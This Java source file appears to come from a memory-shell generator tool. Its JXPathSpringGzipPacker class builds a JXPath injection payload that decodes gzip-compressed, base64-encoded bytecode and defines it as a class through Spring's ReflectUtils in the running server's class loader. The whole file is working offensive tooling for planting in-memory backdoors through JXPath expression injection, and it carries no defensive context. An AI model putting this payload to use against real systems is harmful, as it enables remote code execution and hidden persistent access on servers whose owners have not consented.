package org.leo.jmg.mem.packer.jxpath;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "JXPathSpringGzip", group = "JXPath", order = 2)
public class JXPathSpringGzipPacker implements Packer {
    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(org.springframework.util.Base64Utils.decodeFromString('{{base64Str}}')))),getContextClassLoader(java.lang.Thread.currentThread())))";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", PackerRegistry.getOrThrow("GzipBase64").pack(config));
    }
}

